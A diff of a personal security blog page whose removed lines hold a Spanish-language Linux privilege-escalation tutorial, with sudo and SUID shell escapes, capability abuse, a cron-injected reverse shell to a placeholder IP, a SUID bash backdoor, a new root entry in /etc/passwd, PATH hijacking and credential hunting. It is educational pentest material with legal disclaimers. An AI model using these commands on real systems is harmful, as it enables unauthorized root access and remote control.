@@ -2,11 +2,12 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self' cdnjs.cloudflare.com unpkg.com 'unsafe-inline'; style-src 'self' 'unsafe-inline'; img-src 'self' data:; connect-src 'none';">
+<meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self' https://gc.zgo.at https://cdnjs.cloudflare.com https://unpkg.com 'unsafe-inline'; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; font-src 'self' https://fonts.gstatic.com; img-src 'self' data:; connect-src 'self' https://steganos.goatcounter.com;">
 <meta name="viewport" content="width=device-width,initial-scale=1">
 <title>Privilege Escalation on Linux — SUID, cron jobs and capabilities // The Vault</title>
 <link rel="stylesheet" href="../../css/vault.css">
 <style>
+  /* ── LAYOUT ── */
   .post-layout{display:grid;grid-template-columns:1fr 260px;gap:48px;align-items:start;}
   .toc{position:sticky;top:80px;background:var(--dark2);border:1px solid var(--border);padding:22px;}
   .toc h4{font-family:var(--font-mono);font-size:.65rem;letter-spacing:.22em;color:var(--cyan);text-shadow:var(--glow-c);margin-bottom:16px;text-transform:uppercase;}
@@ -15,338 +16,46 @@
   .toc a{display:block;padding:9px 0;font-family:var(--font-mono);font-size:.68rem;color:var(--text-dim);text-decoration:none;letter-spacing:.08em;transition:color .2s,padding-left .2s;}
   .toc a:hover{color:var(--cyan);padding-left:6px;}
   .toc .toc-sub a{padding-left:14px;font-size:.65rem;}
-  @media(max-width:900px){.post-layout{grid-template-columns:1fr!important;}.toc{position:static!important;margin-bottom:28px;}.post-article{min-width:0;overflow-x:hidden;}.wrapper{padding-left:16px!important;padding-right:16px!important;}}
-  @media(min-width:1440px){.wrapper{max-width:1240px;}}
   #progress{position:fixed;top:56px;left:0;height:2px;background:var(--cyan);box-shadow:var(--glow-c);z-index:999;transition:width .1s;width:0;}
-</style>
-</head>
-<body>
-<div id="progress"></div>
-<canvas id="particles"></canvas>
-<div class="corner tl"></div><div class="corner tr"></div>
-<div class="corner bl"></div><div class="corner br"></div>
 
-<nav>
-  <div class="nav-inner">
-    <a href="../../index.html" class="nav-logo">THE<em>//</em>VAULT</a>
-    <button class="nav-hamburger" aria-label="Menu"><span></span><span></span><span></span></button>
-    <ul class="nav-links">
-      <li><a href="../../index.html"><span class="status-dot"></span>HOME</a></li>
-      <li class="bt"><a href="../../blue-team.html">BLUE TEAM</a></li>
-      <li class="rt"><a href="../../red-team.html">RED TEAM</a></li>
-      <li class="rc"><a href="../../recursos.html">RESOURCES</a></li>
-      <li><a href="../../blog.html">BLOG</a></li>
-    </ul>
-  </div>
-</nav>
+  /* ── RESPONSIVE — código y tablas ── */
+  pre{overflow-x:auto;-webkit-overflow-scrolling:touch;}
+  pre code{white-space:pre;word-break:normal;display:block;}
+  table{display:block;overflow-x:auto;-webkit-overflow-scrolling:touch;width:100%;}
+  img{max-width:100%;height:auto;}
 
-<div class="page-wrap">
-<div class="wrapper" style="padding-top:48px;padding-bottom:60px;">
+  /* ── RESPONSIVE — pantallas <= 900px (tablet / móvil) ── */
+  @media(max-width:900px){
+    .post-layout{grid-template-columns:1fr;}
+    .toc{position:static;margin-bottom:32px;}
+    .post-article{min-width:0;overflow-x:hidden;}
+    .post-article h1{font-size:clamp(1.4rem,5vw,2rem)!important;}
+    .post-article h2{font-size:clamp(1.1rem,4vw,1.5rem)!important;}
+    .wrapper{padding-left:16px!important;padding-right:16px!important;}
+  }
 
-  <div style="font-family:var(--font-mono);font-size:.65rem;letter-spacing:.12em;color:var(--text-dim);margin-bottom:32px;" class="reveal">
-    <a href="../../index.html" style="color:var(--text-dim);text-decoration:none;transition:color .2s;" onmouseover="this.style.color='var(--cyan)'" onmouseout="this.style.color='var(--text-dim)'">HOME</a>
-    <span style="margin:0 10px;color:var(--magenta)"> // </span>
-    <a href="../../blog.html" style="color:var(--text-dim);text-decoration:none;transition:color .2s;" onmouseover="this.style.color='var(--cyan)'" onmouseout="this.style.color='var(--text-dim)'">BLOG</a>
-    <span style="margin:0 10px;color:var(--magenta)"> // </span>
-    <span style="color:var(--cyan)">PRIVILEGE ESCALATION ON LINUX — SUID, CRON JOBS AND CAPABILITIES</span>
-  </div>
+  /* ── RESPONSIVE — pantallas grandes (> 1440px) ── */
+  @media(min-width:1440px){
+    .wrapper{max-width:1200px;margin-left:auto;margin-right:auto;}
+  }
 
-  <div class="reveal" style="margin-bottom:40px;">
-    <div style="display:flex;align-items:center;gap:12px;margin-bottom:14px;flex-wrap:wrap;">
-      <span class="badge m">RED TEAM</span>
-      <span style="font-family:var(--font-mono);font-size:.65rem;color:var(--text-dim);letter-spacing:.1em;">2026-06-14</span>
-      <span style="font-family:var(--font-mono);font-size:.65rem;color:var(--text-dim);">// 14 min</span>
-    </div>
-    <h1 style="font-family:var(--font-hd);font-size:clamp(1.8rem,4vw,3rem);font-weight:900;color:#fff;line-height:1.15;margin-bottom:12px;">Privilege Escalation on Linux — SUID, cron jobs and capabilities</h1>
-    
-  </div>
-
-  <div class="post-layout">
-    <article class="post-article" id="post-content">
-<h1>Privilege Escalation on Linux — SUID, cron jobs and capabilities</h1>
-<blockquote><strong>Red Team</strong> · Actualización del post del 05/08/2020</blockquote><p><em>Situación</em>: Tienes una shell de bajo privilegio en una máquina Linux. Y te preguntas ¿y ahora qué? Este post intenta cubrir la metodología sistemática de escalada de privilegios: desde la enumeración inicial hasta los vectores más explotados — SUID, sudo, cron jobs, capabilities y kernel exploits — con comandos reales y ejemplos prácticos.</p>
-<blockquote>📝 <strong>NOTA:</strong> Todas las técnicas de este post asumen que tienes autorización explícita sobre el sistema objetivo. Aplican a entornos de pentesting legítimo, CTFs y laboratorios propios con fines educativos. RECUERDA que la escalada de privilegios en sistemas ajenos sin permiso es <em>ilegal</em>.</blockquote><hr>
-<h2 id="la-mentalidad-de-la-escalada-de-privilegios">La mentalidad de la escalada de privilegios</h2>
-<p>Conseguir el primer acceso (foothold) rara vez te da control total. Normalmente aterrizas como un usuario sin privilegios — <code>www-data</code>, un usuario de servicio, o una cuenta de bajo nivel. El objetivo de la escalada es pasar de ese acceso limitado a <strong>root</strong>, el control absoluto del sistema.</p>
-<p>La escalada de privilegios en Linux se divide en dos grandes categorías:</p>
-<ul>
-<li><strong>Escalada vertical:</strong> pasar de un usuario sin privilegios a root (o a un usuario con más permisos).</li>
-<li><strong>Escalada horizontal:</strong> moverte lateralmente a otro usuario del mismo nivel, a menudo como paso intermedio.</li>
-</ul>
-<p>La regla de oro: <strong>la enumeración lo es todo</strong>. El 90% del trabajo es encontrar el vector; explotarlo suele ser la parte fácil. Un atacante metódico que enumera bien siempre supera a uno que va lanzando exploits al azar.</p>
-<hr>
-<h2 id="fase-1-enumeracin-inicial">Fase 1: Enumeración inicial</h2>
-<p>Antes de buscar vectores específicos, necesitas entender dónde estás. Estos son los comandos de orientación básica:</p>
-<pre><code># ¿Quién soy y a qué grupos pertenezco?
-id
-whoami
-
-# Información del sistema y versión del kernel
-uname -a
-cat /etc/os-release
-
-# ¿Qué usuarios existen en el sistema?
-cat /etc/passwd | cut -d: -f1
-
-# ¿Qué usuarios tienen shell válida? (objetivos potenciales)
-grep "sh$" /etc/passwd
-
-# Variables de entorno (a veces contienen credenciales)
-env
-
-# ¿Qué hay en mi directorio actual y en /home?
-ls -la
-ls -la /home/*</code></pre><blockquote>💡 <strong>TIP:</strong> Lo primero que debes mirar siempre es <code>sudo -l</code>. Si tu usuario puede ejecutar algo como root sin contraseña, puede que tengas la escalada servida en bandeja antes incluso de empezar a enumerar.</blockquote><h3 id="comprobaciones-de-red-y-procesos">Comprobaciones de red y procesos</h3>
-<pre><code># Procesos corriendo (busca servicios como root)
-ps aux | grep root
-
-# Puertos en escucha (servicios internos no expuestos)
-netstat -tulpn 2&gt;/dev/null
-ss -tulpn
-
-# Conexiones activas
-netstat -antp 2&gt;/dev/null</code></pre><hr>
-<h2 id="fase-2-enumeracin-automatizada">Fase 2: Enumeración automatizada</h2>
-<p>Hacer todo a mano es lento, pero sirve para aprender. Sin embargo, estas herramientas automatizan la búsqueda de vectores y resaltan lo interesante:</p>
-<pre><code># LinPEAS — el estándar de oro, muy completo
-curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
-
-# Si no hay salida a internet, sube el script y ejecútalo
-wget http://TU_IP/linpeas.sh -O /tmp/linpeas.sh
-chmod +x /tmp/linpeas.sh
-/tmp/linpeas.sh
-
-# LinEnum — alternativa más light 
-./LinEnum.sh -t
-
-# pspy — monitoriza procesos sin privilegios de root
-# (excelente para detectar cron jobs en ejecución)
-./pspy64</code></pre><blockquote>⚠️ <strong>ADVERTENCIA:</strong> LinPEAS  hace mucho ruido y deja rastro en logs. En un engagement real con Blue Team activo, ha yque considerar una enumeración manual selectiva en lugar de lanzar scripts que disparan todas las alarmas (eso si se quiere hacer como blackbox, si se tiene permiso de la organziación es mucho mas factible el LinPEAS -&gt; el tiempo es oro).</blockquote><hr>
-<h2 id="fase-3-vectores-de-escalada">Fase 3: Vectores de escalada</h2>
-<h3 id="31-sudo-mal-configurado">3.1 — sudo mal configurado</h3>
-<p>El primer sitio donde mirar. <code>sudo -l</code> muestra qué comandos puede ejecutar tu usuario como root:</p>
-<pre><code>sudo -l</code></pre><p>Una salida típica se vería así:</p>
-<pre><code>Matching Defaults entries for www-data on victim:
-    env_reset, mail_badpass,
-    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin
-
-User www-data may run the following commands on victim:
-    (root) NOPASSWD: /usr/bin/find
-    (root) NOPASSWD: /usr/bin/vim
-    (ALL) /bin/bash</code></pre><p>Cómo leer esto:</p>
-<ul>
-<li><code>(root) NOPASSWD</code>: /usr/bin/find → puedes ejecutar find como root sin contraseña. Vector directo de escalada vía GTFOBins.</li>
-<li><code>(root) NOPASSWD</code>: /usr/bin/vim → lo mismo con vim, otro binario clásico para abrir una shell de root.</li>
-<li><code>(ALL) /bin/bash</code> → puedes ejecutar bash como cualquier usuario (incluido root), aunque aquí sí pediría contraseña al no llevar NOPASSWD.</li>
-</ul>
-<p>Si el resultado muestra binarios que puedes ejecutar como root, consulta <a href="https://gtfobins.github.io/">GTFOBins</a> para ver cómo abusar de ellos. Ejemplos clásicos:</p>
-<pre><code># Si puedes ejecutar 'find' como root
-sudo find . -exec /bin/sh \; -quit
-
-# Si puedes ejecutar 'vim' como root
-sudo vim -c ':!/bin/sh'
-
-# Si puedes ejecutar 'less' como root
-sudo less /etc/profile
-# Dentro de less: !/bin/sh
-
-# Si puedes ejecutar 'python' como root
-sudo python3 -c 'import os; os.system("/bin/sh")'
-
-# Si tienes sudo sobre TODO (ALL)
-sudo su -</code></pre><blockquote>💡 <strong>TIP:</strong> GTFOBins es tu mejor amigo. Para CUALQUIER binario que aparezca en <code>sudo -l</code> o con SUID, búscalo en gtfobins.github.io — te dirá exactamente cómo convertirlo en una shell de root.</blockquote><h3 id="32-binarios-suid">3.2 — Binarios SUID</h3>
-<p>El bit SUID (Set User ID) hace que un binario se ejecute con los permisos de su <strong>propietario</strong>, no del usuario que lo lanza. Si un binario propiedad de root tiene SUID y es explotable, obtienes ejecución como root:</p>
-<pre><code># Buscar todos los binarios con bit SUID
-find / -perm -4000 -type f 2&gt;/dev/null
-
-# Versión más detallada con permisos
-find / -perm -u=s -type f 2&gt;/dev/null -exec ls -la {} \;</code></pre><p>Compara la lista resultante con GTFOBins. Algunos ejemplos de explotación:</p>
-<pre><code># find con SUID
-find . -exec /bin/sh -p \; -quit
-
-# bash con SUID (la -p preserva privilegios)
-/bin/bash -p
-
-# nmap (versiones antiguas en modo interactivo)
-nmap --interactive
-# luego: !sh
-
-# cp con SUID — sobrescribir /etc/passwd
-# Generar hash: openssl passwd -1 -salt abc password
-echo 'root2:HASH:0:0:root:/root:/bin/bash' &gt;&gt; /etc/passwd</code></pre><blockquote>⚠️ <strong>ADVERTENCIA:</strong> Modificar <code>/etc/passwd</code> o <code>/etc/shadow</code> es destroyer y muy detectable. En un engagement real hay que priorizar métodos que no alteren archivos críticos del sistema.</blockquote><h3 id="33-capabilities">3.3 — Capabilities</h3>
-<p>Las capabilities son permisos &quot;granulares&quot; que dan a un binario poderes específicos de root sin el SUID completo. Una capability mal asignada es tan peligrosa como un SUID:</p>
-<pre><code># Listar binarios con capabilities
-getcap -r / 2&gt;/dev/null
-
-# Capability peligrosa: cap_setuid
-# Si python tiene cap_setuid+ep:
-/usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'
-
-# Si perl tiene cap_setuid+ep:
-/usr/bin/perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'</code></pre><p>La capability <code>cap_setuid</code> es la más crítica — permite a un proceso cambiar su UID a 0 (root). Otras peligrosas: <code>cap_dac_read_search</code> (leer cualquier archivo), <code>cap_sys_admin</code> (casi root).</p>
-<h3 id="34-cron-jobs">3.4 — Cron jobs</h3>
-<p>Las tareas programadas (cron) que corren como root y son escribibles por tu usuario son un vector clásico:</p>
-<pre><code># Ver cron jobs del sistema
-cat /etc/crontab
-ls -la /etc/cron.d/
-ls -la /etc/cron.daily/
-
-# Cron jobs de usuarios
-crontab -l
-
-# Monitorizar procesos en tiempo real para CAPTURAR crons
-# (pspy es ideal porque no necesita root)
-./pspy64</code></pre><p>Si encuentras un script ejecutado por cron como root y <strong>puedes escribir en él</strong>, podrías inyectar tu payload:</p>
-<pre><code># Si el script es escribible, añade una reverse shell
-echo 'bash -i &gt;&amp; /dev/tcp/TU_IP/4444 0&gt;&amp;1' &gt;&gt; /ruta/script.sh
-
-# O crea un SUID bash para escalada persistente
-echo 'cp /bin/bash /tmp/rootbash &amp;&amp; chmod +s /tmp/rootbash' &gt;&gt; /ruta/script.sh
-# Espera a que el cron ejecute, luego:
-/tmp/rootbash -p</code></pre><blockquote>💡 <strong>TIP:</strong> A veces el problema no es el script en sí, sino que el cron usa una ruta relativa o un PATH manipulable. Si el cron llama a un binario sin ruta absoluta, puede que puedas colocar un binario malicioso con ese nombre en un directorio del PATH.</blockquote><h3 id="35-path-hijacking">3.5 — PATH hijacking</h3>
-<p>Si un script o binario SUID llama a otro comando sin especificar su ruta absoluta, puedes secuestrar el PATH para que ejecute tu versión:</p>
-<pre><code># Imagina un binario SUID que ejecuta 'service' sin ruta completa
-# Creas tu propio 'service' malicioso:
-echo '/bin/bash -p' &gt; /tmp/service
-chmod +x /tmp/service
-
-# Antepones /tmp al PATH
-export PATH=/tmp:$PATH
-
-# Ejecutas el binario SUID vulnerable — usará TU 'service'
-/ruta/binario_suid</code></pre><h3 id="36-archivos-con-credenciales">3.6 — Archivos con credenciales</h3>
-<p>Las credenciales filtradas en archivos son sorprendentemente comunes  (<em>te asustarías cuando se realiza un forense y vemos esto con gente que se supone que debería de ser la primera en cumplir con las políticas de seguridad</em>):</p>
-<pre><code># Buscar contraseñas en archivos de configuración
-grep -ri "password" /etc/ 2&gt;/dev/null
-grep -ri "password" /var/www/ 2&gt;/dev/null
-
-# Archivos de historial (a veces contienen comandos con contraseñas)
-cat ~/.bash_history
-cat ~/.mysql_history
-
-# Claves SSH privadas
-find / -name "id_rsa" 2&gt;/dev/null
-find / -name "*.pem" 2&gt;/dev/null
-
-# Archivos de backup y configuración
-find / -name "*.bak" 2&gt;/dev/null
-find / -name "config.php" 2&gt;/dev/null</code></pre><h3 id="37-kernel-exploits">3.7 — Kernel exploits</h3>
-<p>Como último recurso (son inestables y pueden hacer tumbar el sistema casi for sure 100% real no fake), un kernel desactualizado puede tener exploits públicos:</p>
-<pre><code># Identificar versión exacta del kernel
-uname -r
-
-# Buscar exploits conocidos
-searchsploit linux kernel 5.4
-
-# Herramienta que sugiere exploits según el kernel
-./linux-exploit-suggester.sh</code></pre><blockquote>⚠️ <strong>ADVERTENCIA:</strong> Los kernel exploits pueden causar kernel panics y tumbar la máquina. Úsalos solo cuando todos los demás vectores fallen, y nunca en producción sin avisar al cliente. En un engagement real pueden costarte la confianza si tiras un servidor crítico y tumbas la operatividad de un cliente.</blockquote><hr>
-<h2 id="fase-4-estabilizar-y-persistir">Fase 4: Estabilizar y persistir</h2>
-<p>Una vez que tienes root, estabiliza el acceso:</p>
-<pre><code># Confirmar que eres root
-id
-# uid=0(root) gid=0(root)
-
-# Si llegaste con un binario SUID, lanza una shell completa
-/tmp/rootbash -p
-
-# Mejorar una shell limitada a TTY completa
-python3 -c 'import pty; pty.spawn("/bin/bash")'
-# Ctrl+Z
-stty raw -echo; fg
-export TERM=xterm</code></pre><p>En un engagement, se debe documentar cómo llegaste a root con capturas y los comandos exactos, a veces incluso se solicita por parte del cliente, un bolcado del history. El informe es tan importante como el acceso.</p>
-<hr>
-<h2 id="checklist-resumen">Checklist resumen</h2>
-<p>Cuando estemos delante de una máquina Linux, repasa esta lista en orden (cada uno puede hacerse su lista propia, esta es de jemplo:</p>
-<ul>
-<li><input disabled="" type="checkbox"> <code>id</code> y <code>sudo -l</code> — comprobación rápida de privilegios</li>
-<li><input disabled="" type="checkbox"> <code>uname -a</code> — versión del kernel</li>
-<li><input disabled="" type="checkbox"> <code>find / -perm -4000 2&gt;/dev/null</code> — binarios SUID</li>
-<li><input disabled="" type="checkbox"> <code>getcap -r / 2&gt;/dev/null</code> — capabilities</li>
-<li><input disabled="" type="checkbox"> <code>cat /etc/crontab</code> + <code>pspy</code> — tareas programadas</li>
-<li><input disabled="" type="checkbox"> Buscar credenciales en config, historial y backups</li>
-<li><input disabled="" type="checkbox"> Claves SSH y archivos sensibles</li>
-<li><input disabled="" type="checkbox"> LinPEAS para una pasada automatizada completa</li>
-<li><input disabled="" type="checkbox"> Kernel exploits como último recurso</li>
-</ul>
-<hr>
-<blockquote>📝 <strong>NOTA:</strong> Este post es de carácter educativo y forma parte de la base de conocimiento de The Vault. Practica estas técnicas en entornos controlados como HackTheBox, TryHackMe o tu propio laboratorio.</blockquote>
-      <hr class="divider">
-      <div style="margin-top:32px;">
-        <a href="../../blog.html" style="background:var(--dark2);border:1px solid var(--border);padding:16px 22px;text-decoration:none;color:var(--text);font-family:var(--font-mono);font-size:.7rem;letter-spacing:.1em;transition:border-color .2s,background .2s;display:inline-block;" onmouseover="this.style.borderColor='rgba(0,255,245,.25)';this.style.background='var(--dark3)'" onmouseout="this.style.borderColor='var(--border)';this.style.background='var(--dark2)'">← BACK TO BLOG</a>
-      </div>
-    </article>
-    
-    <aside class="toc">
-      <h4>// INDEX</h4>
-      <ul>
-        <li><a href="#la-mentalidad-de-la-escalada-de-privilegios">La mentalidad de la escalada de privilegios</a></li>
-        <li><a href="#fase-1-enumeracin-inicial">Fase 1: Enumeración inicial</a></li>
-        <li class="toc-sub"><a href="#comprobaciones-de-red-y-procesos">Comprobaciones de red y procesos</a></li>
-        <li><a href="#fase-2-enumeracin-automatizada">Fase 2: Enumeración automatizada</a></li>
-        <li><a href="#fase-3-vectores-de-escalada">Fase 3: Vectores de escalada</a></li>
-        <li class="toc-sub"><a href="#31-sudo-mal-configurado">3.1 — sudo mal configurado</a></li>
-        <li class="toc-sub"><a href="#32-binarios-suid">3.2 — Binarios SUID</a></li>
-        <li class="toc-sub"><a href="#33-capabilities">3.3 — Capabilities</a></li>
-        <li class="toc-sub"><a href="#34-cron-jobs">3.4 — Cron jobs</a></li>
-        <li class="toc-sub"><a href="#35-path-hijacking">3.5 — PATH hijacking</a></li>
-        <li class="toc-sub"><a href="#36-archivos-con-credenciales">3.6 — Archivos con credenciales</a></li>
-        <li class="toc-sub"><a href="#37-kernel-exploits">3.7 — Kernel exploits</a></li>
-        <li><a href="#fase-4-estabilizar-y-persistir">Fase 4: Estabilizar y persistir</a></li>
-        <li><a href="#checklist-resumen">Checklist resumen</a></li>
-      </ul>
-    </aside>
-  </div>
-
-</div>
-
-<footer>
-  <div class="wrapper">
-    <div class="footer-logo">THE//VAULT</div>
-    <ul class="footer-links">
-      <li><a href="https://github.com/ST3G4N05" target="_blank">GitHub</a></li>
-      <li><a href="#">LinkedIn</a></li>
-    </ul>
-    <p class="footer-copy">© 2024 MUNCHK1N // ST3G4N05 — A VAULT OF DEF/OFFENSIVE KNOWLEDGE</p>
-  </div>
-</footer>
-</div>
-
-<script src="../../js/vault.js"></script>
-<script src="../../js/i18n.js"></script>
-<script>
-  window.addEventListener('scroll', () => {
-    const el = document.getElementById('post-content');
-    const bar = document.getElementById('progress');
-    if (!el || !bar) return;
-    const total = el.offsetHeight - window.innerHeight;
-    const scrolled = Math.max(0, -el.getBoundingClientRect().top);
-    bar.style.width = Math.min(100, (scrolled / total) * 100) + '%';
-  });
-</script>
-</body>
-</html>
-
-<!DOCTYPE html>
-<html lang="en">
-<head>
-<meta charset="UTF-8">
-<meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self' cdnjs.cloudflare.com unpkg.com 'unsafe-inline'; style-src 'self' 'unsafe-inline'; img-src 'self' data:; connect-src 'none';">
-<meta name="viewport" content="width=device-width,initial-scale=1">
-<title>Privilege Escalation on Linux — SUID, cron jobs and capabilities // The Vault</title>
-<link rel="stylesheet" href="../../css/vault.css">
-<style>
-  .post-layout{display:grid;grid-template-columns:1fr 260px;gap:48px;align-items:start;}
-  .toc{position:sticky;top:80px;background:var(--dark2);border:1px solid var(--border);padding:22px;}
-  .toc h4{font-family:var(--font-mono);font-size:.65rem;letter-spacing:.22em;color:var(--cyan);text-shadow:var(--glow-c);margin-bottom:16px;text-transform:uppercase;}
-  .toc ul{list-style:none;}
-  .toc li{border-bottom:1px solid var(--border);}
-  .toc a{display:block;padding:9px 0;font-family:var(--font-mono);font-size:.68rem;color:var(--text-dim);text-decoration:none;letter-spacing:.08em;transition:color .2s,padding-left .2s;}
-  .toc a:hover{color:var(--cyan);padding-left:6px;}
-  .toc .toc-sub a{padding-left:14px;font-size:.65rem;}
-  @media(max-width:900px){.post-layout{grid-template-columns:1fr!important;}.toc{position:static!important;margin-bottom:28px;}.post-article{min-width:0;overflow-x:hidden;}.wrapper{padding-left:16px!important;padding-right:16px!important;}}
-  @media(min-width:1440px){.wrapper{max-width:1240px;}}
-  #progress{position:fixed;top:56px;left:0;height:2px;background:var(--cyan);box-shadow:var(--glow-c);z-index:999;transition:width .1s;width:0;}
-  /* Cursiva real dentro del post (no heredar el em coloreado del logo) */
+  /* ── NOTA TFG ── */
+  .tfg-note{
+    display:flex;align-items:flex-start;gap:14px;
+    background:rgba(0,255,245,.04);
+    border:1px solid rgba(0,255,245,.18);
+    border-left:3px solid var(--cyan);
+    padding:16px 20px;
+    margin:40px 0;
+    font-family:var(--font-mono);
+    font-size:.75rem;
+    letter-spacing:.06em;
+    line-height:1.7;
+    color:var(--text-dim);
+  }
+  .tfg-note a{color:var(--cyan);text-decoration:none;}
+  .tfg-note a:hover{text-shadow:var(--glow-c);}
+  .tfg-note .tfg-icon{font-size:1.1rem;margin-top:2px;flex-shrink:0;}
   .post-article em{font-style:italic;color:inherit;text-shadow:none;}
 </style>
 </head>
@@ -389,8 +98,8 @@ export TERM=xterm</code></pre><p>En un engagement, se debe documentar cómo lleg
       <span style="font-family:var(--font-mono);font-size:.65rem;color:var(--text-dim);" lang-es>// 14 MIN LECTURA</span>
     </div>
     <h1 style="font-family:var(--font-hd);font-size:clamp(1.8rem,4vw,3rem);font-weight:900;color:#fff;line-height:1.15;margin-bottom:12px;">Privilege Escalation on Linux — SUID, cron jobs and capabilities</h1>
-    <p style="font-size:1.05rem;color:var(--text-dim);max-width:680px;line-height:1.75;" lang-en><em>Situation</em>: You have a low-privilege shell on a Linux machine. And you wonder, now what? This post aims to cover the systematic methodology of privilege escalation: from initial enumeration to the most exploited vectors — SUID, sudo, cron jobs, capabilities and kernel exploits — with real commands and practical examples.</p>
-    <p style="font-size:1.05rem;color:var(--text-dim);max-width:680px;line-height:1.75;" lang-es><em>Situación</em>: Tienes una shell de bajo privilegio en una máquina Linux. Y te preguntas ¿y ahora qué? Este post intenta cubrir la metodología sistemática de escalada de privilegios: desde la enumeración inicial hasta los vectores más explotados — SUID, sudo, cron jobs, capabilities y kernel exploits — con comandos reales y ejemplos prácticos.</p>
+    <p style="font-size:1.05rem;color:var(--text-dim);max-width:680px;line-height:1.75;" lang-en><em>Situation</em>: You have a low-privilege shell on a Linux machine. And you wonder, now what? This post covers the systematic methodology of privilege escalation: from initial enumeration to the most exploited vectors — SUID, sudo, cron jobs, capabilities and kernel exploits.</p>
+    <p style="font-size:1.05rem;color:var(--text-dim);max-width:680px;line-height:1.75;" lang-es><em>Situación</em>: Tienes una shell de bajo privilegio en una máquina Linux. Y te preguntas ¿y ahora qué? Este post cubre la metodología sistemática de escalada de privilegios: desde la enumeración inicial hasta los vectores más explotados — SUID, sudo, cron jobs, capabilities y kernel exploits.</p>
   </div>
 
   <div class="post-layout">
@@ -864,8 +573,7 @@ export TERM=xterm</code></pre>
       <div style="margin-top:32px;">
         <a href="../../blog.html" style="background:var(--dark2);border:1px solid var(--border);padding:16px 22px;text-decoration:none;color:var(--text);font-family:var(--font-mono);font-size:.7rem;letter-spacing:.1em;transition:border-color .2s,background .2s;display:inline-block;" onmouseover="this.style.borderColor='rgba(0,255,245,.25)';this.style.background='var(--dark3)'" onmouseout="this.style.borderColor='var(--border)';this.style.background='var(--dark2)'">← BACK TO BLOG</a>
       </div>
-    </article>
-
+    </article>    
     <aside class="toc">
       <h4>// INDEX</h4>
       <ul lang-en>
@@ -907,12 +615,15 @@ export TERM=xterm</code></pre>
 
 <footer>
   <div class="wrapper">
+   <div class="wrapper">
     <div class="footer-logo">THE<em>//</em>VAULT</div>
     <ul class="footer-links">
-      <li><a href="https://github.com/ST3G4N05" target="_blank">GitHub</a></li>
+      <li><a href="https://github.com/stegano5" target="_blank">GitHub</a></li>
       <li><a href="https://www.linkedin.com/in/jordi-mr/">LinkedIn</a></li>
+      <!-- <li><a href="#">Twitter</a></li> -->
+      <!-- <li><a href="#">RSS</a></li> -->
     </ul>
-    <p class="footer-copy">© 2025 MUNCHK1N // ST3G4N05 — A VAULT OF DEF/OFFENSIVE KNOWLEDGE</p>
+    <p class="footer-copy">© 2024 MUNCHK1N // ST3G4N05 — A VAULT OF DEF/OFFENSIVE KNOWLEDGE</p>
   </div>
 </footer>
 </div>
@@ -929,6 +640,10 @@ export TERM=xterm</code></pre>
     bar.style.width = Math.min(100, (scrolled / total) * 100) + '%';
   });
 </script>
+<!-- counter -->  
+<script data-goatcounter="https://steganos.goatcounter.com/count"
+        async src="//gc.zgo.at/count.js"></script>
 </body>
 </html>
+
 
